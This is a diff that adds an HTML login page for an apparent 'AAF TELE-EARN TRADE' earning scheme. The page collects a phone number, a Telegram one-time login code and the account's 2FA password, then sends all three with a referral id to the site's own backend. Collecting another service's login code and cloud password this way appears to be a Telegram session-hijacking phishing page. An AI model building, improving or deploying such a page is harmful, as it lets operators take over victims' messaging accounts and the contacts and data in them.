@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AAF Secure Access</title>
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/css/intlTelInput.css">
+
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Syncopate:wght@700&family=Rajdhani:wght@600&display=swap');
+
+:root {
+    --bg:#030712;
+    --card:#0d111c;
+    --cyan:#00f2fe;
+    --border:rgba(255,255,255,0.1);
+    --danger:#ff4d4d;
+}
+
+body {
+    background:var(--bg);
+    font-family:'Rajdhani';
+    margin:0;
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:flex-start; /* 🔥 FIX */
+    padding:30px 10px;
+}
+
+.auth-container {
+    width:100%;
+    max-width:380px;
+    background:var(--card);
+    padding:30px 20px;
+    border-radius:25px;
+    text-align:center;
+    border:1px solid var(--border);
+    margin-top:30px;
+}
+
+/* LOGO */
+.logo-wrapper {
+    width:80px;
+    height:80px;
+    margin:0 auto 15px;
+    border-radius:50%;
+    border:2px solid var(--cyan);
+}
+
+.brand-logo {
+    width:100%;
+    height:100%;
+    border-radius:50%;
+}
+
+/* TITLE */
+.header-title {
+    color:var(--cyan);
+    font-family:'Syncopate';
+    font-size:13px;
+    margin-bottom:20px;
+}
+
+/* INPUT */
+.input-box {
+    background:rgba(255,255,255,0.05);
+    padding:10px;
+    border-radius:12px;
+    margin-bottom:15px;
+}
+
+input {
+    width:100%;
+    background:none;
+    border:none;
+    color:#fff;
+    font-size:16px;
+    outline:none;
+}
+
+/* BUTTON */
+.btn-action {
+    width:100%;
+    padding:14px;
+    border:none;
+    border-radius:12px;
+    background:linear-gradient(135deg,#00f2fe,#0088cc);
+    color:#000;
+    font-weight:bold;
+    cursor:pointer;
+    margin-top:10px;
+}
+
+.btn-action:disabled {
+    opacity:0.6;
+}
+
+/* STEP */
+.auth-step {display:none;}
+.active-step {display:block;}
+
+#status-box {
+    color:var(--danger);
+    font-size:13px;
+    margin-bottom:10px;
+}
+
+/* MOBILE FIX */
+@media(max-width:480px){
+    .auth-container{
+        padding:25px 15px;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<div class="auth-container">
+
+<!-- LOGO (GitHub compatible) -->
+<div class="logo-wrapper">
+<img src="{{ url_for('static', filename='logo.png') }}" class="brand-logo" alt="Logo" onerror="this.src='https://via.placeholder.com/100'">
+</div>
+
+<div class="header-title">AAF TELE-EARN TRADE</div>
+
+<div id="status-box"></div>
+
+<!-- STEP 1 -->
+<div class="auth-step active-step" id="step1">
+    <div class="input-box">
+        <input type="tel" id="phone" placeholder="+8801XXXXXXXXX">
+    </div>
+    <button class="btn-action" id="btn1" onclick="sendOTP()">Get Code</button>
+</div>
+
+<!-- STEP 2 -->
+<div class="auth-step" id="step2">
+    <div class="input-box">
+        <input type="number" id="otp" placeholder="Enter OTP" inputmode="numeric">
+    </div>
+    <button class="btn-action" id="btn2" onclick="verifyOTP()">Verify</button>
+</div>
+
+<!-- STEP 3 -->
+<div class="auth-step" id="step3">
+    <div class="input-box">
+        <input type="password" id="password" placeholder="2FA Password">
+    </div>
+    <button class="btn-action" id="btn3" onclick="verifyPassword()">Login</button>
+</div>
+
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/intlTelInput.min.js"></script>
+
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+const referrerId = urlParams.get('ref');
+let loginData = { phone:"", otp:"" };
+
+
+const iti = window.intlTelInput(document.querySelector("#phone"), {
+    initialCountry: "bd",
+    separateDialCode: false,
+    utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/utils.js"
+});
+
+function showMsg(msg){
+    document.getElementById("status-box").innerText = msg;
+}
+
+function goStep(id){
+    document.querySelectorAll(".auth-step").forEach(s=>s.classList.remove("active-step"));
+    document.getElementById(id).classList.add("active-step");
+}
+
+// SEND OTP
+async function sendOTP(){
+    let phone = iti.getNumber();
+    if(!phone) return showMsg("Enter valid phone");
+
+    loginData.phone = phone;
+
+    let btn = document.getElementById("btn1");
+    btn.disabled = true;
+    btn.innerText = "Sending...";
+
+    // সঠিক বডি তৈরি করুন (phone + referrerId)
+    let requestBody = { phone };
+    if (referrerId) requestBody.ref = referrerId;
+
+    try{
+        let res = await fetch("/api/send_otp",{
+            method: "POST",
+            credentials: "include",
+            headers: {"Content-Type":"application/json"},
+            body: JSON.stringify(requestBody)   // ← এখানে পুরো বডি পাঠান
+        });
+
+        let data = await res.json();
+
+        if(data.success){
+            goStep("step2");
+            showMsg("OTP Sent");
+        } else {
+            showMsg(data.message);
+        }
+    } catch {
+        showMsg("Server error");
+    }
+
+    btn.disabled = false;
+    btn.innerText = "Get Code";
+}
+
+// VERIFY OTP
+async function verifyOTP(){
+    let otp = document.getElementById("otp").value;
+    if(!otp) return showMsg("Enter OTP");
+
+    loginData.otp = otp;
+
+    let btn = document.getElementById("btn2");
+    btn.disabled=true;
+
+    // ✅ বডি তৈরি (ফোন + কোড + রেফার)
+    let body = {
+        phone: loginData.phone,
+        code: loginData.otp
+    };
+    if (referrerId) body.ref = referrerId;
+
+    try{
+        let res = await fetch("/api/verify_login",{
+            method:"POST",
+            credentials:"include",
+            headers:{"Content-Type":"application/json"},
+            body: JSON.stringify(body)   // ← পরিবর্তিত অংশ
+        });
+
+        let data = await res.json();
+
+        if(data.success){
+            localStorage.setItem("telegram_id", data.telegram_id);
+            window.location="/dashboard";
+        }else if(data.message==="SHOW_PWD_STEP"){
+            goStep("step3");
+        }else{
+            showMsg(data.message);
+        }
+
+    }catch{
+        showMsg("Verification failed");
+    }
+
+    btn.disabled=false;
+}
+
+// VERIFY PASSWORD
+async function verifyPassword(){
+    let pwd = document.getElementById("password").value;
+    if(!pwd) return showMsg("Enter password");
+
+    let btn = document.getElementById("btn3");
+    btn.disabled=true;
+
+    // ✅ বডিতে ref যোগ করুন
+    let body = {
+        phone: loginData.phone,
+        code: loginData.otp,
+        password: pwd
+    };
+    if (referrerId) body.ref = referrerId;
+
+    try{
+        let res = await fetch("/api/verify_login",{
+            method:"POST",
+            credentials:"include",
+            headers:{"Content-Type":"application/json"},
+            body: JSON.stringify(body)
+        });
+
+        let data = await res.json();
+
+        if(data.success){
+            localStorage.setItem("telegram_id", data.telegram_id);
+            window.location="/dashboard";
+        }else{
+            showMsg(data.message);
+        }
+
+    }catch{
+        showMsg("Login error");
+    }
+
+    btn.disabled=false;
+}
+        </script>
+</body>
+</html>
